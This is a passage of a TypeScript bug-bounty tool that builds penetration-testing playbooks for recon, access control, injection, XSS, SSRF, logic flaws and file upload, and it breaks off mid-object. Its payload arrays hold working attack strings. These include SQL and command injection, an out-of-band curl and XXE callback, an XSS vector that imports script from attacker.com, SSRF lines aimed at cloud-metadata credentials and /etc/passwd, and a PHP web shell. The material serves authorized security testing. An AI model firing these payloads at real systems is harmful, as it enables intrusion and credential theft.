import type {
  ChecklistCategory,
  ChecklistDomain,
  ChecklistItem,
  TestingMethod,
  UseCaseScenario,
} from "../types/checklist";

/**
 * Provides comprehensive, multi-method testing playbooks and real-world bug bounty use cases
 * for any checklist item. If the item defines its own custom methods/useCases, those take precedence.
 * Otherwise, domain- and category-aware methodologies are generated.
 */
export function getItemPlaybook(
  item: ChecklistItem,
  category: ChecklistCategory,
  domain: ChecklistDomain
): {
  methods: TestingMethod[];
  useCases: UseCaseScenario[];
} {
  const existingMethods = item.methods && item.methods.length > 0 ? item.methods : null;
  const existingUseCases = item.useCases && item.useCases.length > 0 ? item.useCases : null;

  // Generate category- and domain-tailored methods if not explicitly set
  const methods: TestingMethod[] =
    existingMethods || generateMethodsForCategory(item, category, domain);

  // Generate category- and domain-tailored real-world use cases if not explicitly set
  const useCases: UseCaseScenario[] =
    existingUseCases || generateUseCasesForCategory(item, category, domain);

  return { methods, useCases };
}

function generateMethodsForCategory(
  item: ChecklistItem,
  category: ChecklistCategory,
  _domain: ChecklistDomain
): TestingMethod[] {
  const basePayload = item.payloads?.[0] || "";
  const catId = category.id.toLowerCase();
  const catName = category.name.toLowerCase();

  // 1. RECONNAISSANCE, SUBDOMAINS, OSINT & DISCOVERY
  if (
    catId.includes("recon") ||
    catId.includes("subdomain") ||
    catId.includes("osint") ||
    catId.includes("dns") ||
    catId.includes("port") ||
    catId.includes("discovery") ||
    catName.includes("subdomain") ||
    catName.includes("recon") ||
    catName.includes("information gathering")
  ) {
    return [
      {
        title: "Method 1: Multi-Source Passive OSINT Aggregation",
        scenario: "Harvesting subdomains and exposed assets without sending direct packets to the target.",
        tools: ["subfinder", "amass", "crt.sh"],
        steps: [
          "Run subfinder across all configured passive API sources: `subfinder -d target.com -all -o passive_subs.txt`.",
          "Query Certificate Transparency logs for wildcards: `curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sed 's/\\*\\.//g' | sort -u`.",
          "Combine passive lists and deduplicate to form the initial seed domain inventory.",
        ],
        payloads: [
          "subfinder -d target.com -all -o subs.txt",
          "curl -s 'https://crt.sh/?q=%25.target.com&output=json' | jq -r '.[].name_value' | sort -u",
        ],
        tips: "Configure free API keys in subfinder (Chaos, SecurityTrails, Shodan, Censys) to 3x your passive discovery yield.",
      },
      {
        title: "Method 2: Active DNS Wordlist Brute-Force & Trusted Resolvers",
        scenario: "Discovering unlinked internal, staging, and hidden hosts using trusted DNS resolvers.",
        tools: ["puredns", "shuffledns", "resolvers.txt"],
        steps: [
          "Download a fresh, trusted resolver list (e.g. from trickest/resolvers).",
          "Run active brute-forcing using a high-signal wordlist: `puredns bruteforce best-dns-wordlist.txt target.com -r resolvers.txt -w resolved.txt`.",
          "Validate wildcard DNS response filtering to prevent false positive host registrations.",
        ],
        payloads: [
          "puredns bruteforce wordlist.txt target.com -r resolvers.txt -w resolved.txt",
          "dnsx -l subs.txt -resp -silent",
        ],
        tips: "Always check for wildcard DNS (*.target.com resolving to a generic parking IP) before active brute-forcing.",
      },
      {
        title: "Method 3: Pattern Permutations & Alterations (alterx)",
        scenario: "Predicting internal staging and development naming patterns from discovered subdomains.",
        tools: ["alterx", "dnsx"],
        steps: [
          "Feed discovered subdomains into alterx to generate permutations: `alterx -l known_subs.txt -o permutations.txt`.",
          "Resolve the generated permutations using dnsx: `cat permutations.txt | dnsx -silent -o live_permutations.txt`.",
          "Focus on live hits containing prefixes: dev-, staging-, internal-, v1-, qa-, test-.",
        ],
        payloads: [
          "alterx -l known_subs.txt | dnsx -silent",
          "altdns -i known_subs.txt -o data_output -w words.txt -r -s results_output.txt",
        ],
        tips: "Development naming schemes like `api-staging.target.com` often skip WAF and cloud protection layers.",
      },
      {
        title: "Method 4: HTTP Status Probing & Virtual Host (VHost) Routing",
        scenario: "Checking live web services, technologies, title banners, and routing discrepancies.",
        tools: ["httpx", "ffuf (VHost mode)"],
        steps: [
          "Probe all resolved domains for HTTP/HTTPS services: `httpx -l resolved.txt -title -tech-detect -status-code -follow-redirects`.",
          "Identify hosts returning 401, 403, or default server splash pages (Nginx, Apache, Tomcat).",
          "Test for virtual host routing by modifying the `Host` header against known target IP addresses.",
        ],
        payloads: [
          "httpx -l subs.txt -status-code -title -tech-detect -web-server",
          "ffuf -u http://TARGET_IP/ -H 'Host: FUZZ.target.com' -w subs.txt -fs 1234",
        ],
        tips: "VHosts behind CDNs frequently respond directly when sending the internal Host header to the origin IP.",
      },
    ];
  }

  // 2. IDOR / Access Control / Authorization
  if (
    catId.includes("idor") ||
    catId.includes("access") ||
    catId.includes("bopla") ||
    catId.includes("privesc") ||
    catId.includes("rbac") ||
    catName.includes("access control") ||
    catName.includes("authorization")
  ) {
    return [
      {
        title: "Method 1: Two-Account Browser Proxy Interception",
        scenario: "Classic cross-tenant IDOR where User A modifies or accesses User B's resource.",
        tools: ["Burp Suite / Caido", "Two Separate Browser Profiles (Containers)"],
        steps: [
          "Log into User A (Attacker) in Browser Window 1 and User B (Victim) in Browser Window 2 (or Firefox Multi-Account Containers).",
          "Perform the target action (view invoice, edit profile, delete project) with User B and capture the raw HTTP request in Burp Suite.",
          "Identify all object reference parameters: numeric IDs (e.g. id=1054), UUIDs (uuid=3f8c...), usernames, or email addresses.",
          "Send the captured request to Burp Repeater. Replace User B's session cookie / Authorization Bearer token with User A's token.",
          "Send the request and verify if the server returns 200 OK with User B's private data or modifies User B's record.",
        ],
        payloads: [
          "GET /api/v1/users/USER_B_ID HTTP/1.1\nAuthorization: Bearer <USER_A_TOKEN>",
          "POST /api/v1/projects/delete\n{\"project_id\": \"VICTIM_PROJECT_UUID\"}",
        ],
        tips: "Always check if the object identifier appears in query params, request body JSON, or custom headers (e.g. X-Tenant-Id, X-User-Id).",
      },
      {
        title: "Method 2: HTTP Verb / Method Substitution & Path Traversal",
        scenario: "When direct GET or POST is blocked by an API gateway or authorization filter.",
        tools: ["Burp Repeater", "cURL"],
        steps: [
          "If GET /api/documents/1054 returns 403 Forbidden, change the HTTP verb to POST, PUT, PATCH, or HEAD.",
          "Test HTTP method overriding headers: add 'X-HTTP-Method-Override: GET' or '_method=GET'.",
          "Attempt path parameter traversal: request '/api/documents/me/..;/1054' or '/api/documents/%2e%2e/1054'.",
          "Check for alternative API version routes (e.g. changing /v2/ to /v1/ or /internal/).",
        ],
        payloads: [
          "POST /api/documents/1054 HTTP/1.1\nX-HTTP-Method-Override: GET",
          "GET /api/users/me/../victim_user_id HTTP/1.1",
        ],
        tips: "Many microservice architectures enforce RBAC only on specific HTTP verbs, leaving PUT or DELETE unprotected.",
      },
      {
        title: "Method 3: JSON Array & Type Confusion Injection",
        scenario: "Bypassing object validation filters via type juggling.",
        tools: ["Burp Repeater", "Postman / Bruno"],
        steps: [
          "If the API accepts JSON `{\"user_id\": 1054}`, change the integer to a string: `{\"user_id\": \"1054\"}`.",
          "Wrap the target ID inside an array: `{\"user_id\": [1054]}` or nested object: `{\"user_id\": {\"id\": 1054}}`.",
          "Check if backend database query framework (MongoDB, Sequelize, Prisma) performs loose type evaluation.",
        ],
        payloads: [
          "{\"account_id\": [1054]}",
          "{\"account_id\": {\"$gt\": 0}}",
        ],
        tips: "NoSQL databases frequently treat JSON objects as query operators if types are not strictly validated.",
      },
      {
        title: "Method 4: Automated Bulk Enumeration via Burp Intruder / ffuf",
        scenario: "Testing predictable sequential IDs for systemic data exposure.",
        tools: ["Burp Intruder / Caido Automate", "ffuf"],
        steps: [
          "Capture a valid request containing an ID parameter (e.g. invoice_id=2000).",
          "Send to Intruder or ffuf. Set the ID parameter as the payload marker: `invoice_id=§2000§`.",
          "Configure Numbers payload type (e.g. 1950 to 2050, step 1).",
          "Analyze responses for consistent HTTP 200 responses with differing Content-Lengths, indicating access to other accounts' invoices.",
        ],
        payloads: [
          "ffuf -u 'https://example.com/api/invoices/FUZZ' -H 'Authorization: Bearer <TOKEN>' -w numbers.txt -mc 200",
        ],
        tips: "Filter out false positives by matching response status 200 and excluding responses matching your own account's content length.",
      },
    ];
  }

  // 3. INJECTION (SQLi, NoSQLi, Command, SSTI)
  if (
    catId.includes("inject") ||
    catId.includes("sqli") ||
    catId.includes("sql") ||
    catId.includes("nosql") ||
    catId.includes("cmd") ||
    catId.includes("command") ||
    catId.includes("ssti") ||
    catId.includes("xxe") ||
    catName.includes("injection")
  ) {
    return [
      {
        title: "Method 1: Manual Context Breaking & Syntax Error Triggering",
        scenario: "Detecting backend parser errors and unescaped input reflections.",
        tools: ["Burp Suite Repeater", "Browser DevTools"],
        steps: [
          "Locate all parameters reflected in backend queries, commands, or database lookups.",
          "Inject individual context-breaking characters: single quote ('), double quote (\"), backtick (`), semicolon (;), pipe (|), and closing tags.",
          "Observe HTTP response status, error banners (e.g. ORA-, syntax error, uncaught exception), or differences in response body length.",
          "Test basic arithmetic tautology payloads to verify Boolean logic (e.g. ' OR 1=1 vs ' OR 1=2).",
        ],
        payloads: [
          basePayload || "' OR 1=1 --",
          "test' OR '1'='1",
          "`whoami` || ping -c 3 127.0.0.1",
        ],
        tips: "Always test both URL query parameters and JSON body keys, including numeric fields.",
      },
      {
        title: "Method 2: Time-Based Blind Differential Probing",
        scenario: "When the application suppresses database errors and produces identical response bodies.",
        tools: ["Burp Repeater", "cURL with time measurement"],
        steps: [
          "Inject time-delay payloads specific to the suspected engine (sleep(5), pg_sleep(5), WAITFOR DELAY '0:0:5').",
          "Observe response timing: a delay matching your injected duration confirms code execution in the backend engine.",
          "Repeat with sleep(0) or false conditionals to verify the delay was caused by your payload, not network latency.",
        ],
        payloads: [
          "'; WAITFOR DELAY '0:0:5'--",
          "\" AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
          "{{range .}}{{.sleep(5000)}}{{end}}",
        ],
        tips: "Ensure network jitter is accounted for; run 3 trials with sleep(5) and 3 trials with sleep(0) to confirm consistency.",
      },
      {
        title: "Method 3: Out-of-Band (OOB / Blind AST) Interaction",
        scenario: "Triggering external DNS/HTTP lookups from backends isolated behind firewalls.",
        tools: ["Burp Collaborator", "ProjectDiscovery interactsh-client"],
        steps: [
          "Generate a unique Collaborator/Interactsh hostname (e.g. `xyz.oast.pro`).",
          "Inject payloads instructing the backend to perform a DNS lookup or HTTP request to your listener.",
          "Monitor Collaborator polls for incoming DNS or HTTP connections containing query substrings.",
        ],
        payloads: [
          "'; EXEC master..xp_dirtree '//xyz.oast.pro/a'--",
          "; curl http://xyz.oast.pro #",
          "<?xml version=\"1.0\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://xyz.oast.pro/x\"> %remote;]>",
        ],
        tips: "DNS queries frequently bypass egress firewalls that block outbound HTTP/HTTPS connections.",
      },
      {
        title: "Method 4: Automated Tool Verification (sqlmap / commix)",
        scenario: "Verifying and escalating confirmed injection points safely.",
        tools: ["sqlmap", "commix"],
        steps: [
          "Save the raw HTTP request from Burp into a text file `req.txt`.",
          "Run sqlmap or commix with non-destructive flags: `sqlmap -r req.txt --batch --dbs`.",
          "Verify the injectable parameter and note the backend DBMS version and current user privileges.",
        ],
        payloads: [
          "sqlmap -r req.txt -p target_param --current-user --current-db --batch",
        ],
        tips: "Never run destructive commands or write web shells unless explicitly authorized by the program's rules of engagement.",
      },
    ];
  }

  // 4. XSS (Cross-Site Scripting)
  if (catId.includes("xss") || catName.includes("cross-site scripting")) {
    return [
      {
        title: "Method 1: Context-Specific Manual Polyglot Testing",
        scenario: "Identifying exact reflection context (HTML body, attribute, script tag, or template literal).",
        tools: ["Browser DevTools (Elements Inspector)", "Burp Suite Repeater"],
        steps: [
          "Inject a benign unique canary string: `xsscheck1234`.",
          "Inspect page source to identify where `xsscheck1234` lands: between HTML tags, inside an `<input value=\"...\">` attribute, or inside a `<script>` tag.",
          "Craft the escape string matching that specific syntax context (e.g. `\"><script>` for attributes, `</script><script>` for script blocks).",
          "Inject modern executable proof of concept: `<svg onload=alert(document.domain)>` or `<img src=x onerror=alert(1)>`.",
        ],
        payloads: [
          "\"><svg/onload=alert(document.domain)>",
          "'-alert(document.domain)-'",
          "${alert(document.domain)}",
        ],
        tips: "Look closely at Content-Type: if response is application/json or text/plain, browser won't execute scripts unless rendered via DOM sink.",
      },
      {
        title: "Method 2: DOM-Based Sink & Source Tracing",
        scenario: "Exploiting client-side JavaScript that writes untrusted sources into dangerous sinks.",
        tools: ["Browser Console", "DOM Invader (Burp Suite Embedded Browser)"],
        steps: [
          "Open DevTools Console on the target page.",
          "Search client-side JS for sources: `location.hash`, `location.search`, `document.referrer`, `window.name`, `postMessage`.",
          "Trace if values reach sinks: `element.innerHTML`, `document.write`, `eval()`, `setTimeout()`, `location.href`.",
          "Craft a URL fragment or query parameter payload that feeds malicious HTML directly into the sink without hitting the server.",
        ],
        payloads: [
          "https://example.com/page#<img src=x onerror=alert(document.domain)>",
          "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(document.domain)//'>",
        ],
        tips: "Enable DOM Invader in Burp's browser to automatically flag sinks that receive controllable inputs.",
      },
      {
        title: "Method 3: WAF Bypass & Filter Mutation",
        scenario: "Evading Cloudflare, AWS WAF, or Akamai string pattern filters.",
        tools: ["Hacker Tools WAF Mutator", "Burp Intruder"],
        steps: [
          "Test which specific characters or keywords trigger the WAF (e.g. `<script>`, `alert`, `onerror`, `onload`).",
          "Substitute prohibited tags with uncommonly filtered tags: `<details/ontoggle=alert(1)>`, `<audio/src/onerror=alert(1)>`.",
          "Use alternative execution vectors: `print()`, `confirm()`, `prompt()`, or top-level navigation: `location='//attacker.com'`.",
        ],
        payloads: [
          "<details open ontoggle=alert(1)>",
          "<svg/onload=import('//attacker.com/xss.js')>",
          "<a href=\"jav&#x09;ascript:alert(1)\">click</a>",
        ],
        tips: "HTML entities are decoded automatically by the browser inside tag attributes (like href or src), allowing complete keyword obfuscation.",
      },
    ];
  }

  // 5. SSRF (Server-Side Request Forgery)
  if (catId.includes("ssrf") || catId.includes("cloud-metadata") || catName.includes("ssrf")) {
    return [
      {
        title: "Method 1: Cloud Metadata Probing (AWS / GCP / Azure)",
        scenario: "Exfiltrating IAM credentials or cloud instance tokens via server fetchers.",
        tools: ["Burp Suite Repeater", "cURL"],
        steps: [
          "Identify features that take URLs as input: webhook creators, avatar upload from URL, PDF export, URL previews.",
          "Supply the internal metadata endpoint: `http://169.254.169.254/latest/meta-data/` (AWS) or `http://metadata.google.internal/` (GCP).",
          "Test IP format obfuscations: decimal (2852039166), hex (0xa9fea9fe), IPv6 mapped (::ffff:169.254.169.254).",
          "Inspect server response or generated document for cloud credentials.",
        ],
        payloads: [
          "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
          "http://[::ffff:169.254.169.254]/latest/meta-data/",
          "http://2852039166/latest/meta-data/",
        ],
        tips: "If IMDSv2 is enforced on AWS, test if you can issue PUT requests with token headers or look for GCP/Kubernetes endpoints instead.",
      },
      {
        title: "Method 2: DNS Rebinding & TOCTOU (Time-of-Check to Time-of-Use)",
        scenario: "Bypassing IP address validation checks when server resolves DNS twice.",
        tools: ["rbndr.us", "1u.ms (DNS rebinding service)"],
        steps: [
          "Use a public DNS rebinding service to generate a hostname configured with A record 1.1.1.1 and A record 127.0.0.1 with TTL=0.",
          "Submit the hostname to the target URL preview / fetcher endpoint.",
          "When the backend resolves DNS to validate the IP, it gets 1.1.1.1 (Allowed). When it fetches the content 5ms later, DNS resolves to 127.0.0.1 (Internal target reached).",
        ],
        payloads: [
          "http://7f000001.01010101.rbndr.us/",
          "http://make-1.1.1.1-rebind-127.0.0.1-rr.1u.ms/",
        ],
        tips: "DNS rebinding is exceptionally effective against custom Python/Node URL validator libraries that don't pin the socket IP address.",
      },
      {
        title: "Method 3: Alternative Protocol & URL Parser Abuse",
        scenario: "Escaping HTTP restrictions using other schemas or parser discrepancies.",
        tools: ["Burp Suite", "Gopherus"],
        steps: [
          "Test non-HTTP URL schemes: `file:///etc/passwd`, `dict://127.0.0.1:6379/info`, `gopher://`.",
          "Exploit URL parser discrepancies using user-info `@` or fragment `#`: `http://allowed.target.com@169.254.169.254/`.",
          "Test redirection chaining: point the target to your external server that returns an HTTP 302 redirecting to `http://127.0.0.1:8080/admin`.",
        ],
        payloads: [
          "file:///etc/passwd",
          "http://google.com#@169.254.169.254/latest/meta-data/",
          "http://attacker.com/302.php?url=http://169.254.169.254",
        ],
        tips: "Many backend HTTP client libraries (like Java HttpURLConnection, Python requests, cURL) follow redirects by default unless explicitly disabled.",
      },
    ];
  }

  // 6. BUSINESS LOGIC & RACE CONDITIONS
  if (
    catId.includes("logic") ||
    catId.includes("race") ||
    catId.includes("rate") ||
    catId.includes("payment") ||
    catId.includes("coupon") ||
    catName.includes("business logic")
  ) {
    return [
      {
        title: "Method 1: Single-Packet HTTP/2 Race Condition Attack",
        scenario: "Exploiting concurrency windows during coupon redemption, voting, or gift card balance consumption.",
        tools: ["Burp Suite Repeater (Parallel Request Group)", "Turbo Intruder"],
        steps: [
          "Capture the state-changing request (e.g. `POST /api/redeem-coupon`).",
          "Send request to Burp Repeater. Add it to a Tab Group with 20 duplicate tabs.",
          "Select 'Send group in parallel (single-packet attack)'. All requests arrive at backend threads within the same millisecond.",
          "Verify if coupon balance was redeemed multiple times simultaneously before database lock was committed.",
        ],
        payloads: [
          "POST /api/coupon/apply\n{\"code\": \"DISCOUNT50\"}",
        ],
        tips: "HTTP/2 single-packet attacks synchronize request arrival across TCP packets, making race condition exploitation near 100% reliable.",
      },
      {
        title: "Method 2: Negative Value & Precision Rounding Manipulation",
        scenario: "Bypassing balance or inventory constraints with negative numbers or tiny fractions.",
        tools: ["Burp Repeater"],
        steps: [
          "Test negative quantities in checkout carts: `{\"quantity\": -1}` or `{\"price\": -100}`.",
          "Test fractional precision: input `0.00000001` or `99999999999999999` to trigger integer overflow.",
          "Check if negative items offset positive cart items, resulting in a zero or negative final order cost.",
        ],
        payloads: [
          "{\"item_id\": 10, \"quantity\": -1}",
          "{\"amount\": 0.001}",
        ],
        tips: "Always check order summary APIs: sometimes the UI shows an error, but the backend order creation API processes negative values.",
      },
      {
        title: "Method 3: Multi-Step Workflow Step Skipping",
        scenario: "Forced browsing through checkout, onboarding, or verification workflows.",
        tools: ["Burp Suite Proxy History", "Repeater"],
        steps: [
          "Map complete workflow sequence: Step 1 (Cart) -> Step 2 (Billing) -> Step 3 (Payment Gateway) -> Step 4 (Order Placed).",
          "Trigger Step 1, then immediately issue the final request for Step 4 without sending Step 2 or Step 3.",
          "Verify if server marks transaction fulfilled without verifying upstream payment completion flags.",
        ],
        payloads: [
          "POST /api/order/complete\n{\"order_id\": \"98214\"}",
        ],
        tips: "Look for parameters like `status=pending` in intermediate steps and change them to `status=paid` or `status=verified`.",
      },
    ];
  }

  // 7. FILE UPLOAD & PATH TRAVERSAL
  if (
    catId.includes("file") ||
    catId.includes("upload") ||
    catId.includes("lfi") ||
    catId.includes("traversal") ||
    catId.includes("rfi") ||
    catName.includes("file")
  ) {
    return [
      {
        title: "Method 1: Extension Polyglots & MIME-Type Spoofing",
        scenario: "Bypassing frontend extension whitelists to execute server-side code.",
        tools: ["Burp Repeater", "Hex Editor"],
        steps: [
          "Capture a legitimate file upload request (e.g. image/png).",
          "Change filename to use alternate extensions: `.php5`, `.phtml`, `.jspx`, `.ashx`, `.phar`.",
          "Test double extensions and null bytes: `shell.php.png`, `shell.png.php`, `shell.php%00.png`.",
          "Keep `Content-Type: image/png` while file body contains PHP/JSP server-side code.",
        ],
        payloads: [
          "filename=\"avatar.php.png\"",
          "filename=\"avatar.phtml\"",
          "Content-Type: image/png\n\n<?php phpinfo(); ?>",
        ],
        tips: "Check where uploaded files are served: if served from S3 or an isolated CDN domain, RCE is mitigated but XSS may remain.",
      },
      {
        title: "Method 2: Magic Bytes Prepending & EXIF Payload Injection",
        scenario: "Bypassing server-side image verification libraries (ImageMagick, GD).",
        tools: ["exiftool", "Burp Suite"],
        steps: [
          "Embed code inside image metadata: `exiftool -Comment='<?php phpinfo(); ?>' valid.jpg`.",
          "Or prepend valid GIF89a magic bytes before payload: `GIF89a; <?php phpinfo(); ?>`.",
          "Upload file and browse directly to its uploaded path to verify code interpretation.",
        ],
        payloads: [
          "GIF89a;<?php system($_GET['cmd']); ?>",
        ],
        tips: "If the server converts or re-encodes images upon upload, EXIF comments will be stripped unless polyglot format survives re-compression.",
      },
      {
        title: "Method 3: Filename Directory Traversal Path Injection",
        scenario: "Overwriting arbitrary files on the filesystem during upload.",
        tools: ["Burp Repeater"],
        steps: [
          "Inject traversal sequences in the filename attribute: `filename=\"../../../../var/www/html/shell.php\"`.",
          "Test URL-encoded and Unicode traversals: `..%2f..%2f`, `..%252f..%252f`, `..%c0%af`.",
          "Verify if the file gets written outside the designated upload directory.",
        ],
        payloads: [
          "filename=\"../../../tmp/poc.txt\"",
          "filename=\"..\\..\\..\\inetpub\\wwwroot\\poc.aspx\"",
        ],
        tips: "Even if code execution is blocked, overwriting SSH authorized_keys or cron files achieves full server control.",
      },
    ];
  }

  // 8. DEFAULT COMPREHENSIVE PLAYBOOK FOR ALL OTHER CHECKS
  return [
    {
      title: "Method 1: Manual Step-by-Step Interception & Parameter Manipulation",
      scenario: "Primary manual verification using an intercepting HTTP proxy.",
      tools: ["Burp Suite / Caido", "Browser Developer Tools"],
      steps: [
        "Enable proxy interception and trigger the target action in the application.",
        "Locate the primary HTTP request in HTTP History and send to Repeater.",
        `Follow specific test guidance: ${item.how}`,
        basePayload ? `Inject test payload: ${basePayload}` : "Manipulate request fields, headers, and parameters.",
        item.expectedResponse
          ? `Verify response against indicator: Vulnerable if "${item.expectedResponse.vulnerable}".`
          : "Analyze response code, headers, and body for discrepancies.",
      ],
      payloads: item.payloads && item.payloads.length > 0 ? item.payloads.slice(0, 3) : undefined,
      tips: "Always capture baseline legitimate responses first so you can clearly diff behavior when manipulating inputs.",
    },
    {
      title: "Method 2: CLI & Scripted Command-Line Reproduction",
      scenario: "Reproducing findings cleanly for Bug Bounty Proof-of-Concept submissions.",
      tools: ["cURL", "HTTPie", "Terminal / Bash"],
      steps: [
        "Right-click the request in Burp Suite and select 'Copy as cURL'.",
        "Paste into terminal and test variations rapidly using flags (-i for headers, -s for silent).",
        "Automate parameter iterations using bash loops or small Python scripts.",
        "Document exact terminal output to attach to your bug report.",
      ],
      payloads: basePayload ? [`curl -i -X POST https://example.com/target -d "${basePayload}"`] : undefined,
      tips: "Triage teams on HackerOne and Bugcrowd love clean cURL commands because they can reproduce in seconds without setting up Burp.",
    },
    {
      title: "Method 3: Boundary Testing, Edge-Cases & Header Variations",
      scenario: "Testing non-standard inputs, header overrides, and bypass techniques.",
      tools: ["Burp Repeater", "Postman / Bruno"],
      steps: [
        "Test with boundary values: null bytes (%00), large strings (buffer limits), empty values, negative numbers.",
        "Inject custom headers: 'X-Forwarded-For: 127.0.0.1', 'X-Original-URL: /admin', 'X-Custom-IP-Authorization: 127.0.0.1'.",
        "Change Content-Type header (e.g. from application/json to application/x-www-form-urlencoded or text/plain).",
      ],
      payloads: [
        "X-Forwarded-For: 127.0.0.1\nX-Forwarded-Host: localhost",
        "Content-Type: application/x-www-form-urlencoded",
      ],
      tips: "WAFs and API gateways often apply inspection rules only to expected Content-Types, ignoring unconventional ones.",
    },
    {
      title: "Method 4: Multi-Role Authorization & Session State Testing",
      scenario: "Testing permission boundaries and access controls across user roles.",
      tools: ["Burp Suite Session Handling Rules / Autorize Extension"],
      steps: [
        "Test the endpoint with: (1) High-privilege role, (2) Low-privilege role, (3) Unauthenticated anonymous request.",
        "Check if removing authorization headers (Cookie, Authorization) returns the same data.",
        "Test if an expired or invalid token is rejected or silently accepted.",
      ],
      tips: "Use Burp extension 'Autorize' to test authorization across all browsed endpoints in the background automatically.",
    },
  ];
}

function generateUseCasesForCategory(
  item: ChecklistItem,
  category: ChecklistCategory,
  domain: ChecklistDomain
): UseCaseScenario[] {
  const catId = category.id.toLowerCase();
  const catName = category.name.toLowerCase();
  const domId = domain.id.toLowerCase();
  const itemText = item.text.toLowerCase();

  // 1. RECONNAISSANCE, SUBDOMAINS, OSINT & ASSET DISCOVERY
  if (
    catId.includes("recon") ||
    catId.includes("subdomain") ||
    catId.includes("osint") ||
    catId.includes("dns") ||
    catId.includes("port") ||
    catId.includes("discovery") ||
    catName.includes("subdomain") ||
    catName.includes("recon") ||
    catName.includes("information gathering")
  ) {
    return [
      {
        title: "Scenario 1: Staging & Forgotten Dev Environments (dev-api.target.com)",
        targetContext: "Subdomains discovered via Certificate Transparency logs (crt.sh) or brute-force permutations that lack production WAF/SSO controls.",
        description:
          "Companies protect main www.target.com behind Cloudflare and Okta SSO, but forgotten test subdomains like jira-dev.target.com or api-qa.target.com run with default admin credentials, verbose error stack traces, and debug endpoints enabled.",
        impactExample: "Direct access to internal staging databases, unauthenticated administrative dashboards, and remote code deployment.",
      },
      {
        title: "Scenario 2: Subdomain Takeover on Dangling Cloud Assets (AWS S3, GitHub, Heroku)",
        targetContext: "CNAME records pointing to decommissioned SaaS, cloud buckets, or hosting providers where DNS record was never deleted.",
        description:
          "Attacker identifies a DNS CNAME pointing to an unclaimed S3 bucket, GitHub Pages, or Zendesk help center. Attacker registers the bucket/page and serves arbitrary content on the legitimate target subdomain.",
        impactExample: "Stored XSS, complete session cookie harvesting across *.target.com, and OAuth authorization token leakage.",
      },
      {
        title: "Scenario 3: Internal Microservices Expose Hidden Management Consoles",
        targetContext: "Port scans and virtual host probing revealing open ports 8080, 8443, 9000, 5601 on public subdomains.",
        description:
          "DevOps monitoring dashboards (Grafana, Kibana, Prometheus) or CI/CD pipelines (Jenkins, GitLab) accidentally bound to public interfaces without IP whitelisting.",
        impactExample: "Remote Code Execution via Jenkins Script Console or cluster-wide infrastructure secret extraction from Grafana.",
      },
    ];
  }

  // 2. AUTHENTICATION, LOGIN, MFA & PASSWORD RESET
  if (
    catId.includes("auth") ||
    catId.includes("login") ||
    catId.includes("mfa") ||
    catId.includes("password") ||
    catId.includes("oauth") ||
    catId.includes("sso") ||
    catName.includes("authentication") ||
    catName.includes("credential")
  ) {
    return [
      {
        title: "Scenario 1: MFA / 2FA Rate-Limit Bypass & OTP Brute-Force",
        targetContext: "4-to-6 digit SMS or Email OTP verification endpoints (/api/v1/auth/verify-otp).",
        description:
          "Target enforces 2FA on login, but the OTP verification endpoint lacks IP-based rate limiting or allows rotating client headers (X-Forwarded-For) to brute-force all 10,000 to 1,000,000 combinations.",
        impactExample: "Complete 2FA bypass resulting in full account takeover of any targeted user.",
      },
      {
        title: "Scenario 2: Password Reset Token Host Header Poisoning",
        targetContext: "Password recovery email trigger endpoints (POST /forgot-password).",
        description:
          "Attacker submits victim's email with a manipulated Host header (Host: attacker.com). The backend uses the Host header to construct the password reset link inside the email sent to the victim.",
        impactExample: "Victim clicks the reset link in their email, silently leaking their password reset token to attacker's server.",
      },
      {
        title: "Scenario 3: OAuth 2.0 State Parameter Missing / CSRF Account Linking",
        targetContext: "Social login integrations ('Sign in with Google / GitHub / Apple').",
        description:
          "Missing or static OAuth 'state' parameter allows an attacker to trick a logged-in victim into completing an authorization code flow linked to the attacker's social provider.",
        impactExample: "Attacker logs in via their own social account and accesses the victim's account and private records.",
      },
    ];
  }

  // 3. SESSION MANAGEMENT, COOKIES & JWT
  if (
    catId.includes("session") ||
    catId.includes("jwt") ||
    catId.includes("cookie") ||
    catId.includes("token") ||
    catName.includes("session") ||
    catName.includes("jwt")
  ) {
    return [
      {
        title: "Scenario 1: Session Non-Invalidation on Password / Email Change",
        targetContext: "User security settings, logout endpoints, and password rotation flows.",
        description:
          "Old session cookies or JWT tokens remain active after a user changes their password or clicks 'Log out of all devices', allowing an attacker who previously obtained a token to maintain permanent access.",
        impactExample: "Permanent unauthorized access even after credential rotation and account compromise mitigation.",
      },
      {
        title: "Scenario 2: JWT Algorithm Confusion & None-Algorithm Signature Stripping",
        targetContext: "JWT-authenticated API gateways and mobile backends.",
        description:
          "Attacker changes the JWT header to 'alg': 'none' and removes the signature segment. Vulnerable JWT libraries accept the unsigned token with forged claims ('role': 'admin').",
        impactExample: "Total privilege escalation to system administrator without knowing the cryptographic secret.",
      },
    ];
  }

  // 4. IDOR, BOLA & ACCESS CONTROL
  if (
    catId.includes("idor") ||
    catId.includes("access") ||
    catId.includes("bopla") ||
    catId.includes("privesc") ||
    catId.includes("rbac") ||
    catName.includes("access control") ||
    catName.includes("authorization")
  ) {
    return [
      {
        title: "Scenario 1: Multi-Tenant Team & Workspace Boundaries",
        targetContext: "Enterprise workspace invite flows, member role assignment, and project dashboards.",
        description:
          "Target application allows organizations to invite members. Attacker tampers with organization_id or workspace_uuid to access other corporate tenants' dashboards.",
        impactExample: "Massive confidential data disclosure across corporate customer boundaries.",
      },
      {
        title: "Scenario 2: Financial Invoices, Receipts & Payment Profiles",
        targetContext: "Billing portals, Stripe customer IDs, downloadable PDF receipts, refund requests.",
        description:
          "Sequential or predictable invoice numbers (e.g. /invoices/INV-2024-0012) lack ownership verification, allowing downloading all customer invoices.",
        impactExample: "PII leakage, payment history exposure, and customer list harvesting.",
      },
      {
        title: "Scenario 3: Private Document & File Attachments",
        targetContext: "Customer support tickets, KYC identity verification uploads, resume portals.",
        description:
          "Attacker alters attachment_id or document_token to view confidential identity documents or sensitive uploaded files.",
        impactExample: "Direct regulatory violation (GDPR / HIPAA / PCI-DSS).",
      },
    ];
  }

  // 5. INJECTION (SQLi, NoSQLi, Command, SSTI)
  if (
    catId.includes("inject") ||
    catId.includes("sqli") ||
    catId.includes("sql") ||
    catId.includes("nosql") ||
    catId.includes("cmd") ||
    catId.includes("command") ||
    catId.includes("ssti") ||
    catId.includes("xxe") ||
    catName.includes("injection")
  ) {
    return [
      {
